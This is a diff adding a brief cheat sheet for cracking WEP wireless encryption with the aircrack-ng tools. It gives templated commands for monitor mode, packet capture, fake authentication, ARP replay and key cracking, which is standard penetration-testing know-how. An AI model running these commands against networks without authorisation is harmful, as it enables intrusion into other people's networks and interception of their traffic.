@@ -1,0 +1,22 @@
+CRACKING WEP VIA A CLIENT ATTACK
+Cracking WEP via a Client Attack
+-----------------------------------------
+
+Place your wireless card into monitor mode on the AP channel:
+
+airmon-ng start <interface> <AP channel>
+
+Start a capture dump, filtering on the AP channel and BSSID, saving the capture to a file:
+
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+
+Next, conduct a fake authentication against the access point:
+
+aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+
+Launch the interactive packet replay attack looking for ARP packets coming from the AP:
+
+aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
+
+aircrack-ng -z <capture>
+
